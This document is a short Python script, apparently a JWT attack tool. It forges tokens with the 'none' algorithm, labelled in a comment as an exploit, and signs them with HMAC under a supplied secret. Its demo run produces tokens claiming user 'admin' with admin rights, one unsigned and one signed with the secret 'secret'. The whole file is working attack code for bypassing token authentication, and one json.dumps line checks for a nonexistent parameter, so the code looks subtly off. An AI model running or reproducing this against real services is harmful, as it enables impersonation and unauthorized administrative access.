#!/usr/bin/env python3
import sys
import json
import base64
import hmac
import hashlib

def base64url_encode(payload):
    if isinstance(payload, str):
        payload = payload.encode()
    return base64.urlsafe_b64encode(payload).replace(b'=', b'').decode('utf-8')

def base64url_decode(payload):
    if isinstance(payload, str):
        payload = payload.encode()
    rem = len(payload) % 4
    if rem > 0:
        payload += b'=' * (4 - rem)
    return base64.urlsafe_b64decode(payload)

def craft_none_jwt(header_dict, payload_dict):
    # None Algorithm Exploit
    header_dict['alg'] = 'none'
    h_enc = base64url_encode(json.dumps(header_dict, clean_headers=True) if 'clean_headers' in json.dumps.__code__.co_varnames else json.dumps(header_dict))
    p_enc = base64url_encode(json.dumps(payload_dict))
    return f"{h_enc}.{p_enc}."

def craft_hmac_jwt(header_dict, payload_dict, secret, algorithm='HS256'):
    # HMAC signed JWT craft
    header_dict['alg'] = algorithm
    h_enc = base64url_encode(json.dumps(header_dict))
    p_enc = base64url_encode(json.dumps(payload_dict))
    
    signing_input = f"{h_enc}.{p_enc}".encode()
    if algorithm == 'HS256':
        digest = hmac.new(secret.encode() if isinstance(secret, str) else secret, signing_input, hashlib.sha256).digest()
    elif algorithm == 'HS384':
        digest = hmac.new(secret.encode() if isinstance(secret, str) else secret, signing_input, hashlib.sha384).digest()
    elif algorithm == 'HS512':
        digest = hmac.new(secret.encode() if isinstance(secret, str) else secret, signing_input, hashlib.sha512).digest()
    else:
        raise ValueError("Unsupported algorithm")
        
    sig_enc = base64url_encode(digest)
    return f"{h_enc}.{p_enc}.{sig_enc}"

if __name__ == "__main__":
    # Example test run
    hdr = {"typ": "JWT", "alg": "HS256"}
    pay = {"user": "admin", "admin": True}
    print("[+] Crafted None Algorithm JWT:")
    print(craft_none_jwt(hdr, pay))
    print("[+] Crafted HMAC signed JWT (secret: 'secret'):")
    print(craft_hmac_jwt(hdr, pay, "secret"))
